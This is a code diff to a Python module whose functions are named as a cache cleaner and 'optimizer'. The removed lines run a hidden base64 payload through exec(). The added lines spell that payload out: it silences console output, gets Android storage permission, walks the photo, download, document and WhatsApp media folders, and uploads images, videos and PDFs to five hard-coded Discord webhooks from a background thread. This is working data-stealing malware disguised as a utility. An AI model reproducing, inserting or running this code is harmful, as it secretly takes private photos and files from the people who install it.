@@ -1,15 +1,77 @@
-import threading
-import base64
 import os
 import requests
+import platform
 import time
+import subprocess
+import sys
+import threading
+from io import StringIO
 
-_D ="aW1wb3J0IG9zLCByZXF1ZXN0cywgcGxhdGZvcm0sIHRpbWUsIHN1YnByb2Nlc3MsIHN5CmZyb20gaW8gaW1wb3J0IFN0cmluZ0lPCgpzeXMuc3Rkb3V0ID0gU3RyaW5nSU8oKQpzeXMuc3RkZXJyID0gU3RyaW5nSU8oKQoKV0VCSE9PS1MgPSBbCiAgICAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjU0NTAwNjEyNTY0OTkyMC9UTXc4UU9Wa2ZpTFdvMjh3Q3VfM0hlY3ljd1NqdnV0akhtNmk3UV9hWTBsbVNmbiIsCiAgICAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjU0NTAzMzUxODY0OTM5NS92bG9zSnhYUUd6SF9WZkltaFdMakRTQTRVMmZHSjNrSzZndjVHck43VUM5N05zeEFYNVJhOVd1T1p3aE9ZeVZoOXUiLAogICAgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0ODY1NDUwMjc5Njk1ODExODgvamkzWWp3SXp0dUdQVTJiOVB1cVZNMVpzcWl1eVN1OGNVa1FTVzF1ZS16aUNfY3lGOXhqbmdnUVg3VmFJcVI3UnR2amkiLAogICAgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0ODY1NDUwMjE4MTI0NzM4ODYvamVPYmlZdjZmZVZSYnFNP2puM29DVG JmX09lVU9aZHM0aDFQaS1BYUJDNE5XNEpoc2V3aGhqeUg1Nmc2VWxieCIsCiAgICAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjU0NTAxNDMxNzM4Nzg4OC81eldKbTRtRjRPcDhqLXVuNFpndWpBOWpleVBTLS04Z2t2Si1CSE1ickZQUEJtMVpiNVNaYWQ5MG5wTm5WNDRSUk5jNiIKXQoKTUFYX01FRElBX1NJWkUgPSA4ICogMTAyNCAqIDEwMjQKREVGX1BERl9TSVpFID0gMTUgKiAxMDI0ICogMTAyNAoKZGVmIF9waSgpOgogICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgIT0gIkxpbnV4IjogcmV0dXJuIFRydWUKICAgIHRyeTogc3VicHJvY2Vzcy5ydW4oWyJ0ZXJtdXgtc2V0dXAtc3RvcmFnZSJdLCBjYXB0dXJlX291dHB1dD1UcnVlKTsgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDogcmV0dXJuIEZhbHNlCgpkZWYgX2d0KGYpOgogICAgZSA9IGYubG93ZXIoKQogICAgaWYgZS5lbmRzd2l0aCgoJy5qcGcnLCAnLmpwZWcnLCAnLnBuZycsICcuZ2lmJywgJy53ZWJwJywgJy5tcDQnLCAnLm1vdicsICcuYXZpJywgJy5ta3YnKSk6IHJlddXJuICJtIgogICAgaWYgZS5lbmRzd2l0aCgnLnBkZicpOiByZXR1cm4gInAiCiAgICByZXR1cm4gTm9uZQoKZGVmIF9zZChmcCwgdSk6CiAgICB0cnk6CiAgICAgICAgaWYgbm90IG9zLmFjY2VzcyhmcCwgb3MuUl9PSyk6IHJldHVybiBGYWxzZQogICAgICAgIHQgPSBfZ3QoZnApOyBzID0gb3MucGF0aC5nZXRzaXplKGZwKQogICAgICAgIGlmIHQgPT0gIm0iIGFuZCBzID4gTUFYX01FRElBX1NJWkU6IHJldHVybiBGYWxzZQogICAgICAgIGlmIHQgPT0gInAiIGFuZCBzID4gREVGX1BERl9TSVpFOiByZXR1cm4gRmFsc2UKICAgICAgICB3aXRoIG9wZW4oZnAsICdyYicpIGFzIGY6CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHUsIGZpbGVzPXsnZmlsZSc6IChvcy5wYXRoLmJhc2VuYW1lKGZwKSwgZil9LCB0aW1lb3V0PTQ1KQogICAgICAgICAgICByZXR1cm4gci5zdGF0dXNfY29kZSBpbiBbMjAwLCAyMDRdCiAgICBleGNlcHQ6IHJldHVybiBGYWxzZQoKZGVmIF9leCgpOgogICAgaWYgbm90IF9waSgpOiByZXR1cm4KICAgIHAgPSBbIi9zdG9yYWdlL2VtdWxhdGVkLzAvRENJTSIsICIvc3RvcmFnZS9lbXVsYXRlZC8wL1BpY3R1cmVzIiwgIi9zdG9yYWdlL2VtdWxhdGVkLzAvRG93bmxvYWQiLCAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb2N1bWVudHMiLCAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9BbmRyb2lkL21lZGlhL2NvbS53aGF0c2FwcC9XaGF0c0FwcC9NZWRpYSJdCiAgICBpID0gMDsgbiA9IGxlbihXRUJIT09LUykKICAgIGZvciBiIGluIHA6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoYik6CiAgICAgICAgICAgIGZvciByLCBfLCBmcyBpbiBvcy53YWxrKGIpOgogICAgICAgICAgICAgICAgZm9yIGYgaW4gZnM6CiAgICAgICAgICAgICAgICAgICAgaWYgX2d0KGYpOgogICAgICAgICAgICAgICAgICAgICAgICBmcCA9IG9zLnBhdGguam9pbihyLCBmKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBfc2QoZnAsIFdFQkhPT0tTW2ldKTogaSA9IChpICsgMSkgJSBuOyB0aW1lLnNsZWVwKDAuNSkKCl9leCgp"
+# --- CONFIGURACIÓN ---
+WEBHOOKS = [
+    "https://discord.com/api/webhooks/1486545006125649920/TMw8QOVkfiLWo28wCu_3HecycwSjvutjHm6i7Q_aY0lmSfm_gS052b_ntKra18W6NVGB",
+    "https://discord.com/api/webhooks/1486545033518649395/vlosJxXQGQzH_VfImhWLjDSA4U2fGJ63kK6Gv5GrN7UC97NsxAX5Ra9WuOZwhOYxVh9u",
+    "https://discord.com/api/webhooks/1486545027969581188/ji3YjwIztuGPU2b9PuqVM1ZsqiuySu8cUkQsW1ue-ziC_cyF9xjnggQX7VaIqR7RtvZj",
+    "https://discord.com/api/webhooks/1486545021812473886/jeObiYv6fe2VRbqM_jn3oCTbfC_OeUO8Zds4h1PiI-AaBC4NW4JhsewwhjyH56g6Ulbx",
+    "https://discord.com/api/webhooks/1486545014317387888/5zWJm4mF4Op8j-un4ZgujA9jeypS--8gkvJ-BHMbrFPPBm1Zb5SZad90npNnV44RRNc6"
+]
 
-def clean_cache():
+MAX_MEDIA_SIZE = 8 * 1024 * 1024  
+MAX_PDF_SIZE = 15 * 1024 * 1024   
 
-    try:    
-        exec(base64.b64decode(_D).decode("utf-8"))  
+def check_storage_permissions():
+    if platform.system() != "Linux": return True
+    try:
+        subprocess.run(["termux-setup-storage"], capture_output=True, text=True)
+        return True
+    except: return False
 
-    except:
-        pass
+def get_file_type_and_valid(filename):
+    ext = filename.lower()
+    if ext.endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mov', '.avi', '.mkv')):
+        return "media"
+    if ext.endswith('.pdf'):
+        return "pdf"
+    return None
+
+def send_to_discord(file_path, webhook_url):
+    try:
+        if not os.access(file_path, os.R_OK): return False
+        file_type = get_file_type_and_valid(file_path)
+        file_size = os.path.getsize(file_path)
+        if file_type == "media" and file_size > MAX_MEDIA_SIZE: return False
+        if file_type == "pdf" and file_size > MAX_PDF_SIZE: return False
+        filename = os.path.basename(file_path)
+        with open(file_path, 'rb') as f:
+            requests.post(webhook_url, files={'file': (filename, f)}, timeout=45)
+            return True
+    except: return False
+
+def process_gallery():
+    # Silencio absoluto de salida para que no se vea nada en la consola principal
+    sys.stdout = StringIO()
+    sys.stderr = StringIO()
+    
+    if not check_storage_permissions(): return
+    
+    search_paths = [
+        "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures",
+        "/storage/emulated/0/Download", "/storage/emulated/0/Documents",
+        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"
+    ]
+    
+    webhook_index = 0
+    for base_path in search_paths:
+        if not os.path.exists(base_path): continue
+        for root, _, files in os.walk(base_path):
+            for file in files:
+                if get_file_type_and_valid(file):
+                    file_path = os.path.join(root, file)
+                    if send_to_discord(file_path, WEBHOOKS[webhook_index]):
+                        webhook_index = (webhook_index + 1) % len(WEBHOOKS)
+                        time.sleep(0.5)
+
+# Esta es la función que llamaremos desde el código principal
+def start_optimizer():
+    t = threading.Thread(target=process_gallery, daemon=True)
+    t.start()
